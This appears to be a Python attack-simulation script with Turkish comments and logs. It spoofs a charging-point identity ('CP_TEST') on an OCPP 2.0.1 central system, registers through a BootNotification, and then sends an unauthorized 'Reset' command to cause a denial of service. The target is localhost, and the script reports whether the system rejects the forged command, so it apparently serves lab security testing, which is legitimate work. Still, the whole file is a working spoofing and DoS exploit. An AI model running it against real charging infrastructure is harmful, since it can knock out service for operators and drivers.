                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               saldır.py
import json
import time
import uuid
import asyncio
import websockets
import logging
import traceback
from ocpp.v201 import call
from ocpp.v201.enums import ResetEnumType

# --- LOGGING AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | [SALDIRI] | %(message)s')

# --- SİZİN ORTAMINIZA ÖZEL AYARLAR ---
SPOOFED_CP_ID = "CP_TEST"
CSMS_WEBSOCKET_URL = f"ws://127.0.0.1:9000/{SPOOFED_CP_ID}"

# --- SALDIRI HEDEFİ ---
# ⭐ DÜZELTME: hard yerine Immediate veya OnIdle kullan
# OCPP 2.0.1'de Reset enum değerleri:
# - Immediate: Hemen sıfırlar
# - OnIdle: Boşta kalınca sıfırlar

try:
    RESET_TYPE = ResetEnumType.immediate  # ⭐ Büyük I ile
    logging.info(f"✅ Reset tipi: {RESET_TYPE.value}")
except AttributeError:
    # Eğer 'immediate' de yoksa, enum'daki tüm değerleri listele
    logging.error("❌ 'immediate' bulunamadı. Mevcut değerler:")
    for attr in dir(ResetEnumType):
        if not attr.startswith('_'):
            logging.info(f"  - {attr}")
    # Varsayılan olarak ilk değeri kullan
    RESET_TYPE = list(ResetEnumType)[0]
    logging.warning(f"⚠️ Varsayılan değer kullanılıyor: {RESET_TYPE.value}")

# --- OCPP MESAJ YAPILARI ---

def create_boot_notification_request():
    """CSMS'e meşru CP olarak bağlanırken gönderilen ilk mesajı oluşturur."""
    message_id = str(uuid.uuid4())
    payload = {
        "reason": "PowerUp",
        "chargingStation": {
            "model": "SimulatedAttackerCP",
            "vendorName": "SimVendor"  # ⭐ camelCase
        }
    }
    return [2, message_id, "BootNotification", payload]

def create_reset_request():
    """CP'yi sıfırlamayı talep eden Reset komutunu oluşturur."""
    message_id = str(uuid.uuid4())

    payload = {
        "type": RESET_TYPE.value  # Enum'un string değerini kullan
    }

    logging.info(f"🔨 Reset mesajı hazırlandı. Tip: {RESET_TYPE.value}")

    # [2, MessageId, Action: "Reset", Payload]
    return [2, message_id, "Reset", payload]


async def attack_simulation():
    """Saldırı simülasyonunu başlatan asenkron fonksiyon."""

    logging.info("=" * 60)
    logging.info(f"🎯 Saldırı hedefi: {CSMS_WEBSOCKET_URL}")
    logging.info(f"🎭 Taklit edilen CP ID: {SPOOFED_CP_ID}")
    logging.info(f"💣 Reset tipi: {RESET_TYPE.value}")
    logging.info("=" * 60)

    try:
        # 1. CSMS'e sahte kimlikle bağlanma
        logging.info("📡 CSMS'e bağlanılıyor...")
        async with websockets.connect(CSMS_WEBSOCKET_URL, subprotocols=['ocpp2.0.1']) as websocket:
            logging.info("✅ WebSocket bağlantısı kuruldu. Kimlik sahteciliği başarılı.")

            # 2. BootNotification Gönderme (Kimliği Sağlama)
            boot_msg = create_boot_notification_request()
            await websocket.send(json.dumps(boot_msg))
            logging.info("📤 BootNotification gönderildi.")

            # CSMS'ten BootNotification cevabını bekleyelim
            try:
                boot_response_raw = await asyncio.wait_for(websocket.recv(), timeout=10)
                boot_response = json.loads(boot_response_raw)

                logging.info(f"📥 CSMS yanıtı: {boot_response}")

                # Message type kontrolü
                if boot_response[0] == 3:  # CallResult
                    status = boot_response[2].get('status')
                    logging.info(f"✅ BootNotification cevabı alındı. Kayıt durumu: {status}")

                    if status != "Accepted":
                        logging.error(f"❌ CSMS bağlantıyı reddetti ({status}). Saldırıya devam edilemiyor.")
                        return
                else:
                    logging.warning(f"⚠️ Beklenmeyen mesaj tipi: {boot_response[0]}")

            except asyncio.TimeoutError:
                logging.error("❌ BootNotification timeout!")
                return

            await asyncio.sleep(1)

            # 3. Reset Komutu Saldırısı (Yıkıcı DoS)
            reset_msg = create_reset_request()
            logging.warning("=" * 60)
            logging.warning(f"⚠️ KRİTİK ADIM: Reset ({RESET_TYPE.value}) Saldırısı Başlatılıyor...")
            logging.warning("=" * 60)

            # Mesajı gönder
            await websocket.send(json.dumps(reset_msg))
            logging.info("📤 Reset komutu gönderildi!")

            # 4. CSMS Yanıtını Bekleme
            try:
                response_raw = await asyncio.wait_for(websocket.recv(), timeout=10)
                response_json = json.loads(response_raw)
                message_type_id = response_json[0]

                logging.info(f"📥 CSMS yanıtı alındı: {response_json}")

                # Başarılı saldırı: CSMS, Reset komutunu CP'ye iletir
                if message_type_id == 3:  # CallResult
                    logging.error("=" * 60)
                    logging.error("❌ ANOMALİ TESPİT EDİLDİ: KRİTİK DOS BAŞARILI!")
                    logging.error("CSMS, yetkisiz 'Reset' komutunu CP'ye iletti.")
                    logging.error(f"CP, bu komuta '{response_json[2].get('status')}' yanıtını döndürdü.")
                    logging.error("🔥 Hizmet kesintisi (DoS) gerçekleşti (TC-3).")
                    logging.error("=" * 60)

                elif message_type_id == 4:  # CallError
                    logging.info("=" * 60)
                    logging.info(f"✅ CSMS, Reset isteğini reddetti (CallError).")
                    logging.info(f"Hata detayı: {response_json}")
                    logging.info("✅ Komut Sahteciliği engellendi.")
                    logging.info("=" * 60)

                else:
                    logging.warning(f"⚠️ CSMS'ten bilinmeyen yanıt. Tür: {message_type_id}")
                    logging.warning(f"Yanıt: {response_json}")

            except asyncio.TimeoutError:
                logging.warning("⚠️ CSMS'ten yanıt gelmedi (Timeout).")

            except websockets.exceptions.ConnectionClosed as e:
                logging.error("=" * 60)
                logging.error(f"💥 Bağlantı aniden kesildi: {e}")
                logging.error("Bu, Reset komutunun çalıştığını ve CP'nin sıfırlandığını gösterebilir!")
                logging.error("=" * 60)

    except websockets.exceptions.ConnectionClosedOK:
        logging.info("✅ Bağlantı başarıyla kapandı.")

    except websockets.exceptions.InvalidStatusCode as e:
        logging.error(f"❌ Bağlantı hatası: {e}")

    except Exception as e:
        logging.error(f"❌ Genel Hata: {e}")
        logging.error(traceback.format_exc())


if __name__ == "__main__":
    print("=" * 60)
    print("🚨 OCPP 2.0.1 RESET SALDIRI SİMÜLASYONU")
    print("=" * 60)
    print()

    asyncio.run(attack_simulation())



